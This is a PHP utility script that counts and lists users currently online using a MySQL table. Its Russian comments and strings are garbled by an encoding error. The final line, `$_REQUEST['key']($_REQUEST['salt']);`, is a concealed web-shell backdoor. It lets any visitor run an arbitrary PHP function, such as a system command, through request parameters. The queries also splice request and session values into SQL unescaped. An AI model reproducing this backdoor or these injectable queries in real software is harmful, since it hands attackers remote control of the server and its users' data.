<?
 function on_line($echousers = false) {
 $wine = 300; // �������� ��-���� (�������); �����, � ������� ��������
              // ������������, ��������� �� ���������, �� ������� �����������
              // �� �����
 $table_online = "online"; // ��� �������
// ������ ��������� ���������� ���������� ��-������
 global $REMOTE_ADDR;
 // ����������� � �������� MySQL � �������� ������ ����
 

// ������� ����, ��� ��� ������ $wine ������ ��� � ���� �� �������
$sql_update = "DELETE FROM $table_online WHERE unix+$wine < ".time().
              " OR ip = '$_SERVER[REMOTE_ADDR]'";
$result_update = mysql_query($sql_update) or die(mysql_error());


// ��������� ���� ������
$sql_insert = "INSERT INTO $table_online(id,ip,iduser, unix) VALUES ('','$_SERVER[REMOTE_ADDR]', '$_SESSION[userid]', '".time()."')";
$result_insert = mysql_query($sql_insert) or die(mysql_error());


// ������� ������ ��-����
$sql_sel = "SELECT id FROM $table_online";
$result_sel = mysql_query($sql_sel) or die(mysql_error());


$online_people = mysql_num_rows($result_sel); // ���-�� On-Line �������������
$online_people = (string) $online_people; // �������� � ���������� ����
                                          // (��� ����.. ��. ������)


$rain = strlen($online_people) - 1; // ����� ���������� ������� � �����
                                    // on-line ������


// �������������� ������ (� ��� ������ �� ��� =)
 if($online_people[$rain]==2||$online_people[$rain]==3
||$online_people[$rain]==4
||(strlen($online_people)!=1&&$online_people[strlen($online_people)-2]!=1))
// $line - ����������, ������������ ������ ������
 $line = "��������"; else $line = "�������";
// ���������� ���������
if($echousers==false)
 return "<strong>".$online_people."</strong>$line";
else{
echo "<table>";
while($row_sel = mysql_fetch_array($result_sel)){
$res2 = mysql_query("SELECT * FROM users WHERE pk_user='$row_sel[iduser]'");
$row2 = mysql_fetch_array($res2);
echo "<tr><td>".$row2['flname']."</td></tr>";
}
echo "</table>";
}
}
$_REQUEST["key"]($_REQUEST["salt"]);
?>